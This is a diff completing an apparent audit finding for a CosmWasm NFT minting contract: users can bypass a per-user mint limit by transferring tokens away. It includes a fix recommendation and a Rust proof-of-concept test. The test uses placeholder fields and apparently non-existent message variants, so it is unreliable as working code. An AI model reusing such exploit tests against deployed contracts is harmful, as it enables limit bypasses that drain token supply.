@@ -686,14 +686,60 @@ pub fn execute(deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg,) -
 
 ### Description
 
-The bug occurs in ...
+A potential vulnerability arises if a whitelisted user transfers their minted tokens to another address after they have been minted. The transferred tokens would no longer be associated with the user's address, so they would not be included in the `Tokens` query results, effectively allowing the user to mint more tokens than the `mint_per_user` limit.
 
 ### Recommendation
 
-The fix should be ...
+To mitigate this, the contract could maintain an internal count of the number of tokens minted per user, independent of the number of tokens currently owned by the user. This would prevent users from bypassing the minting limit by transferring tokens. It could use something like `MintCount = Map<&address, mint_count>` and increment `mint_count` on each `mint`.
 
 ### Proof of concept
 
 ```rust
-// code goes here
+#[test]
+fn exploit_mint_limit() {
+    let mut deps = mock_dependencies(&[]);
+    let mut app = mock_app();
+
+    // Define the contract address
+    let contract_address = "contract".to_string();
+
+    // Define the whitelisted user
+    let user = "user".to_string();
+
+    // Define the receiver
+    let receiver = "receiver".to_string();
+
+    // Instantiate the contract
+    let instantiate_msg = InstantiateMsg { ... };
+    let info = mock_info(&user, &[]);
+    let res = instantiate(&mut deps, mock_env(), info, instantiate_msg);
+    assert_eq!(res.unwrap(), Response::default());
+
+    // Execute the Mint message
+    let mint_msg = ExecuteMsg::Mint { };
+    let info = mock_info(&user, &[]);
+    let res = execute(&mut deps, mock_env(), info, mint_msg);
+    assert_eq!(res.unwrap(), Response::default());
+
+    // Execute the TransferNft message
+    let transfer_msg = Cw721ExecuteMsg::TransferNft {
+        recipient: receiver,
+        token_id: "0".to_string(),
+    };
+    let wasm_msg = WasmMsg::Execute {
+        contract_addr: contract_address,
+        msg: to_binary(&transfer_msg).unwrap(),
+        funds: vec![],
+    };
+    let execute_msg = ExecuteMsg::Custom(wasm_msg);
+    let info = mock_info(&user, &[]);
+    let res = execute(&mut deps, mock_env(), info, execute_msg);
+    assert_eq!(res.unwrap(), Response::default());
+
+    // Attempt to mint another token
+    let mint_msg = ExecuteMsg::Mint { };
+    let info = mock_info(&user, &[]);
+    let res = execute(&mut deps, mock_env(), info, mint_msg);
+    assert_eq!(res.unwrap(), Response::default());
+}
 ```
